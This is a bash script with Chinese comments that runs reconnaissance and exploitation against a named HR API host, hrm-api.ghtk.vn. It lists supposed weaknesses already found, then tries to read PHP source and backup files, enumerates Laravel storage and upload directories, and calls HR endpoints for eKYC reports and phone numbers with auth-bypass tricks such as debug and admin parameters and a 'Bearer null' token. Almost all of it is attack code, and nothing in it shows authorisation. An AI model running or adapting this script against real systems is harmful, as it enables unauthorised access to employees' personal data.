#!/bin/bash
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥🔥🔥 终极深度利用 - 从已知突破点出发"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "已确认的突破点："
echo "1. ✅ hrm-api.ghtk.vn/.htaccess 可读"
echo "2. ✅ hrm-api.ghtk.vn/index.php 可访问"
echo "3. ✅ 内网IP泄露（可能SSRF）"
echo "4. ✅ API文档公开"
echo ""

TARGET="hrm-api.ghtk.vn"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🎯 攻击1：利用index.php，尝试读取PHP源码"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

# PHP源码读取尝试（使用php://filter）
PHP_FILES=(
    "/index.php"
    "/public/index.php"
    "/bootstrap/app.php"
)

for file in "${PHP_FILES[@]}"; do
    echo "[*] 尝试读取: $file"
    
    # 方法1：直接访问
    echo "  [1] 直接访问..."
    curl -sk "https://$TARGET$file" | head -20
    
    # 方法2：添加.txt后缀
    echo "  [2] $file.txt..."
    curl -sk "https://$TARGET$file.txt" 2>&1 | head -10
    
    # 方法3：双重扩展名
    echo "  [3] $file.bak..."
    curl -sk "https://$TARGET$file.bak" 2>&1 | head -10
    
    echo "━━━"
done

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🎯 攻击2：深度目录遍历"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

# 从.htaccess得知是Laravel，尝试常见路径
LARAVEL_PATHS=(
    "/storage"
    "/storage/logs"
    "/storage/app"
    "/storage/framework"
    "/storage/framework/sessions"
    "/public"
    "/public/uploads"
    "/public/images"
    "/public/files"
    "/uploads"
    "/files"
    "/download"
    "/export"
)

for path in "${LARAVEL_PATHS[@]}"; do
    echo -n "  $path → "
    resp=$(curl -sk "https://$TARGET$path/" -I -m 2 2>&1 | head -1)
    echo "$resp" | grep -qE "200|301|403" && echo "⚠️  $resp" || echo "❌ 404"
done

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🎯 攻击3：测试已知的API端点（从JS提取的250+）"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

# 测试高价值API
HIGH_VALUE_APIS=(
    "/AdHr/getEkycReports"
    "/AdMasterProfile/getPhoneNumber"
    "/AdHrTeams/getTeamOption"
    "/api/user/list"
    "/api/admin/users"
)

for api in "${HIGH_VALUE_APIS[@]}"; do
    echo "[*] 深度测试: $api"
    
    # 无认证
    echo -n "  [1] 无认证 → "
    curl -sk "https://$TARGET$api" -w "%{http_code}" -o /tmp/api1 -m 2 2>/dev/null
    cat /tmp/api1 | jq -e '.data' >/dev/null 2>&1 && echo "✅ 有数据！" || echo "❌"
    
    # 添加调试参数
    echo -n "  [2] ?debug=1 → "
    curl -sk "https://$TARGET$api?debug=1" -w "%{http_code}" -o /tmp/api2 -m 2 2>/dev/null
    cat /tmp/api2 | jq -e '.data' >/dev/null 2>&1 && echo "✅ 有数据！" || echo "❌"
    
    # 添加admin参数
    echo -n "  [3] ?admin=true → "
    curl -sk "https://$TARGET$api?admin=true" -w "%{http_code}" -o /tmp/api3 -m 2 2>/dev/null
    cat /tmp/api3 | jq -e '.data' >/dev/null 2>&1 && echo "✅ 有数据！" || echo "❌"
    
    # 空JWT
    echo -n "  [4] Bearer null → "
    curl -sk "https://$TARGET$api" -H "Authorization: Bearer null" -w "%{http_code}" -o /tmp/api4 -m 2 2>/dev/null
    cat /tmp/api4 | jq -e '.data' >/dev/null 2>&1 && echo "✅ 有数据！" || echo "❌"
    
    echo ""
done

